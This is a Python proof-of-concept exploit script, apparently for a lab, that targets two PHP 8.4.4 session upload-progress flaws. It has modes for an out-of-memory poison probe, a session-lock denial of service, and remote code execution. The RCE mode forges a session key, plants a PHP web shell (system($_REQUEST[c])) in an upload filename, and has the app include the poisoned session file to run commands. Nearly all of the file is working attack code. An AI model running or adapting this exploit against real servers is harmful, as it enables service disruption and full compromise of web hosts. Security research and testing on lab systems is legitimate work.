#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell — CVE-2026-109618/109619 full lab PoC against LOCAL stock PHP 8.4.4 php -S.

  probe <host:port>   : OOM poison (BG(serialize) dangling) trigger + liveness check
  dos   <host:port>   : same-SID flock-hang DoS (worker deadlocks glocks to that SID)
  rce   <host:port>   : upload_progress KEY-injection -> $_SESSION['page'] forgery ->
                        self-include of the poisoned session file -> system(cmd)
                        (works on stock php only when the app includes a session var,
                        which our deliberately vulnerable lab index.php does)
"""
import http.client, sys, time
from urllib.parse import quote

def mpart(fields, files):
    out = b''
    for name, val in fields:
        out += (b'--BND\r\nContent-Disposition: form-data; name="%b"\r\n\r\n'
                % name.encode()) + val + b'\r\n'
    for fld, fname, data in files:
        fn = fname if isinstance(fname, bytes) else fname.encode()
        out += (b'--BND\r\nContent-Disposition: form-data; name="%b"; filename="%b"\r\n\r\n'
                % (fld.encode(), fn)) + data + b'\r\n'
    return out + b'--BND--\r\n'

def post(host, port, body, cookie=None, timeout=60, uri='/'):
    c = http.client.HTTPConnection(host, port, timeout=timeout)
    h = {'Content-Type': 'multipart/form-data; boundary=BND',
         'Content-Length': str(len(body))}
    if cookie: h['Cookie'] = cookie
    c.request('POST', uri, body, h)
    r = c.getresponse(); d = r.read(); c.close()
    return r.status, d

def get(host, port, uri, cookie=None, timeout=60):
    c = http.client.HTTPConnection(host, port, timeout=timeout)
    h = {'Cookie': cookie} if cookie else {}
    c.request('GET', uri, headers=h)
    r = c.getresponse(); d = r.read(); c.close()
    return r.status, d

BIGNAME = 'A' * 262144

def poison(host, port, sid, nfiles=20):
    files = [('f%d' % i, BIGNAME, b'X') for i in range(nfiles)]
    return post(host, port, mpart([('PHPSESSID', sid.encode()),
                                   ('PHP_SESSION_UPLOAD_PROGRESS', b'poc')], files))

def probe(hp):
    host, port = hp.split(':'); port = int(port)
    sid = 'pocsid%06d' % int(time.time())
    print('[probe] R1 poison sid=%s' % sid)
    t0 = time.time(); st, _ = poison(host, port, sid)
    print('[probe] R1 -> HTTP %d (%.1fs)%s' % (st, time.time()-t0,
          ' = server fatal OOM inside startup serialize' if st == 500 else ''))
    time.sleep(1)
    st, _ = post(host, port, mpart([('PHPSESSID', (sid+'x').encode()),
                                    ('PHP_SESSION_UPLOAD_PROGRESS', b'p2')],
                                   [('f0', 'small.txt', b'x')]))
    print('[probe] R2 (different sid) -> HTTP %d: worker answers (reuse consumed there)' % st)

def dos(hp):
    host, port = hp.split(':'); port = int(port)
    sid = 'dossid%06d' % int(time.time())
    print('[DoS] poison worker with sid=%s' % sid)
    st, _ = poison(host, port, sid)
    print('[DoS] poison -> HTTP %d; flock on sess_%s leaked inside worker' % (st, sid))
    time.sleep(1)
    t0 = time.time()
    try:
        st, _ = post(host, port, mpart([('PHPSESSID', sid.encode())],
                                       [('nothing', 'x', b'y')]), timeout=20)
        print('[DoS] same-sid follow-up -> HTTP %d in %.1fs (lock released?!)'
              % (st, time.time()-t0))
    except Exception as e:
        print('[DoS] same-sid follow-up HUNG %.1fs: %s\n'
              '      -> flock(LOCK_EX) on leaked fd: availability DoS against that SID'
              % (time.time()-t0, type(e).__name__))

def rce(hp, cmd=b'id'):
    host, port = hp.split(':'); port = int(port)
    sid = 'rcesid%06d' % int(time.time())
    # lab layout: docroot = serverROOT, session.save_path = serverROOT/sess
    # => self-include path relative to worker cwd
    page = 'sess/sess_%s' % sid
    # 1) KEY forgery: gets written verbatim as session-map key before the '|';
    #    trailing injected '"page|s:...";' defines $_SESSION['page']=page on next decode.
    inj = b'x|a:0:{};page|s:' + str(len(page)).encode() + b';:"' + page.encode() + b'";'
    st, b = post(host, port, mpart([('PHPSESSID', sid.encode()),
                                    ('PHP_SESSION_UPLOAD_PROGRESS', inj)],
                                   [('f0', 'junk.txt', b'x')]))
    print('[rce] key-inject (page=%s) -> HTTP %d' % (page, st))
    # 2) PHP payload inside filename -> serialized INTO session file
    fname = b'<?php echo "[RCE-OUT]";system($_REQUEST[c]);if(0){ ?>'
    st, _ = post(host, port, mpart([('PHPSESSID', sid.encode()),
                                    ('PHP_SESSION_UPLOAD_PROGRESS', b'poc')],
                                   [('sh', fname, b'x')]))
    print('[rce] php-payload filename -> HTTP %d' % st)
    # 3) trigger: index.php's include $_SESSION['page'] executes session-file text
    uri = '/?c=' + quote(cmd.decode() if isinstance(cmd, bytes) else cmd)
    st, body = get(host, port, uri, cookie='PHPSESSID=' + sid)
    print('[rce] GET %s (cookie PHPSESSID=sid) -> HTTP %d' % (uri, st))
    txt = body.decode('latin-1', 'replace')
    if '[RCE-OUT]' in txt:
        i = txt.index('[RCE-OUT]')
        print('=== COMMAND OUTPUT ===')
        print(txt[i:i+len('[RCE-OUT]')+200])
    else:
        print('[rce] no [RCE-OUT] marker; first 300 bytes:')
        print(txt[:300])
    return st

def help_msg(): print(__doc__)

CMDS = {'probe': probe, 'dos': dos, 'rce': rce, 'help': lambda x: help_msg()}

if __name__ == '__main__':
    if len(sys.argv) < 3: help_msg(); sys.exit(1)
    CMDS[sys.argv[1]](sys.argv[2])
